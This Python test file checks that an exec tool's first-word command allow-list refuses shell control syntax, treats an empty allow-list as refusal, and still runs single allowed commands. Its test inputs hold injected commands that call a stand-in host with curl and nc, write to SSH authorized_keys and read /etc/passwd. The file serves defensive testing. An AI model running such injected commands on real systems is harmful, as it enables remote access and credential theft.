"""Fail-closed gates for first-word command allow-lists.

The execution paths below still hand the complete string to a shell. A check
of only ``first_word(cmd)`` is therefore not an authorization boundary:
``echo ok; second-command`` still starts with ``echo``. Keep the policy in one
helper and exercise both the policy and every call site.
"""
from __future__ import annotations

import sys
from pathlib import Path
from types import SimpleNamespace

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from arena.mcp.tool_exec import handle_exec_tool  # noqa: E402
from arena.security_commands import command_allowlist_reason  # noqa: E402

_ALLOWED = {"echo", "python3", "git"}


@pytest.mark.parametrize(
    "cmd",
    [
        "echo hi; curl https://evil.invalid/x",
        "echo $(id)",
        "echo `whoami`",
        "echo hi | nc evil.invalid 4444",
        "echo x > ~/.ssh/authorized_keys",
        "echo hi & id",
        "echo hi && id",
        "echo hi || id",
        "echo hi < /etc/passwd",
        "echo first\nid",
        "echo first\r\nid",
    ],
)
def test_allowlisted_first_word_does_not_authorize_shell_syntax(cmd: str) -> None:
    reason = command_allowlist_reason(cmd, "echo", _ALLOWED)
    assert reason is not None
    assert "shell control" in reason


def test_empty_allowlist_is_refusal_not_universal_permission() -> None:
    assert command_allowlist_reason("echo safe", "echo", []) == (
        "command allowlist is empty; refusing execution"
    )
    assert command_allowlist_reason("echo safe", "echo", None) == (
        "command allowlist is empty; refusing execution"
    )


def test_single_allowlisted_command_remains_usable() -> None:
    assert command_allowlist_reason("echo safe", "echo", _ALLOWED) is None
    # Shell quoting, Python's -c option and parentheses are ordinary parts of
    # one command; the guard must not turn the cautious profile into a blanket
    # refusal of legitimate scripts.
    assert command_allowlist_reason(
        "python3 -c 'print(1)'", "python3", _ALLOWED
    ) is None
    assert command_allowlist_reason("git status --short", "git", _ALLOWED) is None


def test_every_shell_backed_allowlist_surface_uses_the_shared_guard() -> None:
    root = Path(__file__).resolve().parents[1]
    expected_calls = {
        "arena/api_v2/exec_handler.py": 1,
        "arena/sandbox/handlers.py": 1,
        "arena/exec/handlers.py": 2,
        "arena/mcp/tool_exec.py": 1,
    }
    for relative, count in expected_calls.items():
        source = (root / relative).read_text(encoding="utf-8")
        assert source.count("command_allowlist_reason(") == count, relative


def test_mcp_exec_uses_the_running_profile_and_refuses_shell_control() -> None:
    calls: list[object] = []

    def run_sd(*args, **kwargs):
        calls.append((args, kwargs))
        return 0, "should not run", ""

    ctx = SimpleNamespace(
        blocked_reason=lambda _cmd: None,
        app_config=lambda: {"profile": "cautious"},
        first_word=lambda _cmd: "echo",
        cautious_allow={"echo"},
    )
    result = handle_exec_tool(
        "exec.exec", {"cmd": "echo first; echo second"}, ctx=ctx, run_sd=run_sd
    )

    assert result["isError"] is True
    assert "shell control" in result["content"][0]["text"]
    assert calls == []


def test_mcp_exec_still_runs_one_allowlisted_command() -> None:
    calls: list[object] = []

    def run_sd(*args, **kwargs):
        calls.append((args, kwargs))
        return 0, "legitimate", ""

    ctx = SimpleNamespace(
        blocked_reason=lambda _cmd: None,
        app_config=lambda: {"profile": "cautious"},
        first_word=lambda _cmd: "echo",
        cautious_allow={"echo"},
    )
    result = handle_exec_tool(
        "exec.exec", {"cmd": "echo legitimate"}, ctx=ctx, run_sd=run_sd
    )

    assert result.get("isError") is not True
    assert calls
    assert "legitimate" in result["content"][0]["text"]
